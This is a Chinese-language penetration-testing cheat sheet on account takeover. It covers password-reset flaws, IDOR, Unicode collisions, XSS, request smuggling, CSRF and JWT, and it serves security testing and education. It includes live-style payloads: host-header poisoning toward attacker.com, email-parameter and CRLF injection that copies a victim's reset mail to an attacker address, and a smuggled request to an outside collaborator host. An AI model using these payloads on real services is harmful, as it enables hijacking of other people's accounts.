[原文文档](README.en.md)

# 账户接管

> 账户接管 (ATO) 是网络安全领域的一个重大威胁，涉及通过各种攻击向量未经授权访问用户账户。

## 概要

* [密码重置功能](#密码重置功能)
    * [通过引用者泄露密码重置令牌](#通过引用者泄露密码重置令牌)
    * [通过密码重置投毒进行账户接管](#通过密码重置投毒进行账户接管)
    * [通过电子邮件参数进行密码重置](#通过电子邮件参数进行密码重置)
    * [API 参数上的 IDOR](#api-参数上的-idor)
    * [弱密码重置令牌](#弱密码重置令牌)
    * [泄露密码重置令牌](#泄露密码重置令牌)
    * [通过用户名冲突进行密码重置](#通过用户名冲突进行密码重置)
    * [因 Unicode 标准化问题导致的账户接管](#因-unicode-标准化问题导致的账户接管)
* [通过 Web 漏洞进行账户接管](#通过-web-漏洞进行账户接管)
    * [通过跨站脚本进行账户接管](#通过跨站脚本进行账户接管)
    * [通过 HTTP 请求走私进行账户接管](#通过-http-请求走私进行账户接管)
    * [通过 CSRF 进行账户接管](#通过-csrf-进行账户接管)
* [参考资料](#参考资料)

## 密码重置功能

### 通过引用者泄露密码重置令牌

1. 向您的电子邮件地址请求密码重置
2. 点击密码重置链接
3. 不要更改密码
4. 点击任何第三方网站（例如：Facebook、twitter）
5. 在 Burp Suite 代理中拦截请求
6. 检查引用者头是否泄露了密码重置令牌。

### 通过密码重置投毒进行账户接管

1. 在 Burp Suite 中拦截密码重置请求
2. 在 Burp Suite 中添加或编辑以下头：`Host: attacker.com`，`X-Forwarded-Host: attacker.com`
3. 转发修改后的请求

    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: attacker.com
    ```

4. 查找基于 *host header* 的密码重置 URL，如：`https://attacker.com/reset-password.php?token=TOKEN`

### 通过电子邮件参数进行密码重置

```powershell
# 参数污染
email=victim@mail.com&email=hacker@mail.com

# 电子邮件数组
{"email":["victim@mail.com","hacker@mail.com"]}

# 抄送
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# 分隔符
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### API 参数上的 IDOR

1. 攻击者需要使用自己的账户登录并进入 **更改密码** 功能。
2. 启动 Burp Suite 并拦截请求
3. 将其发送到 Repeater 标签并编辑参数：用户 ID/电子邮件

    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### 弱密码重置令牌

密码重置令牌应每次随机生成且唯一。
尝试确定令牌是否过期或是否始终相同，在某些情况下生成算法较弱且可以被猜测。算法可能使用以下变量。

* 时间戳
* 用户ID
* 用户邮箱
* 姓和名
* 出生日期
* 加密
* 仅数字
* 短令牌序列（[A-Z,a-z,0-9] 之间少于 6 个字符）
* 令牌重用
* 令牌过期日期

### 泄露密码重置令牌

1. 使用 API/用户界面为特定邮箱触发密码重置请求，例如：<test@mail.com>
2. 检查服务器响应并查找 `resetToken`
3. 然后在 URL 中使用令牌，如 `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### 通过用户名冲突进行密码重置

1. 在系统上注册一个与受害者用户名相同但用户名前后插入空格的账户。例如：`"admin "`
2. 使用恶意用户名请求密码重置。
3. 使用发送到您邮箱的令牌重置受害者密码。
4. 使用新密码登录受害者账户。

CTFd 平台曾容易受到此攻击的影响。
参见：[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### 因 Unicode 标准化问题导致的账户接管

在处理涉及 unicode 的用户输入以进行大小写映射或标准化时，可能会出现意外行为。

* 受害者账户：`demo@gmail.com`
* 攻击者账户：`demⓞ@gmail.com`

[Unisub - 是一个可以建议可能转换为给定字符的潜在 unicode 字符的工具](https://github.com/tomnomnom/hacks/tree/master/unisub)。

[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) 可用于根据平台查找合适的 unicode 字符列表。

## 通过 Web 漏洞进行账户接管

### 通过跨站脚本进行账户接管

1. 在应用程序或子域中找到 XSS，如果 cookie 的作用域是父域：`*.domain.com`
2. 泄露当前的 **会话 cookie**
3. 使用 cookie 以该用户身份进行身份验证

### 通过 HTTP 请求走私进行账户接管

参考 **HTTP 请求走私** 漏洞页面。

1. 使用 **smuggler** 检测 HTTP 请求走私类型 (CL, TE, CL.TE)

    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```

2. 构造一个将覆盖 `POST / HTTP/1.1` 的请求，使用以下数据：

    ```powershell
    GET http://something.burpcollaborator.net  HTTP/1.1
    X: 
    ```

3. 最终请求可能如下所示

    ```powershell
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://something.burpcollaborator.net  HTTP/1.1
    X: X
    ```

Hackerone 报告利用此漏洞

* <https://hackerone.com/reports/737140>
* <https://hackerone.com/reports/771666>

### 通过 CSRF 进行账户接管

1. 为 CSRF 创建一个载荷，例如："用于密码更改的自动提交 HTML 表单"
2. 发送载荷

### 通过 JWT 进行账户接管

JSON Web Token 可能被用于验证用户身份。

* 使用另一个用户 ID / 邮箱编辑 JWT
* 检查 JWT 签名是否薄弱

## 参考资料

* [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://www.youtube.com/watch?v=gzM4wWA7RFo)
* [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
* [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
* [CTFd Account Takeover - NIST National Vulnerability Database - March 29, 2020](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
* [Hacking Grindr Accounts with Copy and Paste - Troy Hunt - October 3, 2020](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
